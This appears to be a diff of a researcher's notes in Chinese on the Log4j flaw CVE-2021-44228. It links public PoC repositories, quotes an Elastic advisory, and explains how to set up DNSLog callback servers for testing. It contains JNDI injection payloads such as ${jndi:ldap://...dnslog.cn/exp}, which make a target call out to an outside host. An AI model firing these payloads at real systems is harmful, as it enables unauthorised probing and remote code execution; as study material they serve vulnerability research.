@@ -1,4 +1,7 @@
 # 202112
+## 20211214
+
+
 ## 20211213
 https://www.youtube.com/watch?v=7qoPDq41xhQ
 CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)
@@ -6,6 +9,12 @@ CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)
 https://github.com/xiajun325/apache-log4j-rce-poc
 https://github.com/leonjza/log4jpwn
 https://github.com/YfryTchsGD/Log4jAttackSurface
+  Elasticsearch
+  Elasticsearch is not susceptible to remote code execution with this vulnerability due to our use of the Java Security Manager. Elasticsearch on JDK8 or below is susceptible to an information leak via DNS which is fixed by a simple JVM property change. The information leak does not permit access to data within the Elasticsearch cluster. We will also release a new version of Elasticsearch that contains the JVM property by default and removes certain components of Log4j out of an abundance of caution. Additional details below.
+  由于我们使用Java Security Manager, Elasticsearch不容易受到带有此漏洞的远程代码执行的影响。 
+  在JDK8或更低版本上的Elasticsearch容易通过DNS发生信息泄漏，这可以通过简单的JVM属性更改来修复。 
+  信息泄漏不允许访问Elasticsearch集群中的数据。 
+  我们还将发布一个新版本的Elasticsearch，该版本默认包含JVM属性，为了谨慎起见，它删除了Log4j的某些组件。 
 https://github.com/christophetd/log4shell-vulnerable-app
 
 docker build . -t vulnerable-app
@@ -70,8 +79,52 @@ ${jndi:ldap://mixazx.dnslog.cn/exp}
 ${jndi:rmi://mixazx.dnslog.cn/exp}
 做为参数
 
-Apache Log4j远程代码执行漏洞风险通报信息汇总
-https://www.freebuf.com/articles/308151.html
+http://ceye.io/records/dns
+https://log.xn--9tr.com/
+这个有点慢
+http://dnslog.cn/
+[DNS 原理入门](https://www.ruanyifeng.com/blog/2016/06/dns.html)
+
+[搭建Dnslog](https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/)
+ceye: http://ceye.io/records/dns
+CEYE.IO platform, which monitoring DNS queries and HTTP requests through its own DNS server and HTTP server, it can also create custom files as online payloads. It can help security researchers collect information when testing vulnerabilities (e.g. SSRF/XXE/RFI/RCE).
+
+https://github.com/BugScanTeam/DNSLog
+
+$ git clone git@github.com:BugScanTeam/DNSLog.git
+
+apt install python3-pip -y
+$ cd dnslog
+$ pip3 install -r requirements.pip
+dnslog/dnslog/settings.py
+```python
+   # 做 dns 记录的域名
+   DNS_DOMAIN = 'xxx.club'
+   
+   # 记录管理的域名, 这里前缀根据个人喜好来定
+   ADMIN_DOMAIN = 'admin.xxx.club'
+   
+   # NS域名
+   NS1_DOMAIN = 'ns1.xxx.club'
+   NS2_DOMAIN = 'ns2.xxx.club'
+   
+   # 服务器外网地址
+   SERVER_IP = '1.1.1.1'
+```
+
+python3 manage.py runserver 0.0.0.0:8099
+
+https://github.com/sa1tor/dnslog
+git clone git@github.com:sa1tor/dnslog.git
+apt install python-pip
+cd dnslog
+pip install -r requirement.txt
+python server.py --port=6002
+
+45.33.10.154:6002
+
+
+[Apache Log4j远程代码执行漏洞风险通报信息汇总](https://www.freebuf.com/articles/308151.html)
 
 POC：
 https://www.lunasec.io/docs/blog/log4j-zero-day/
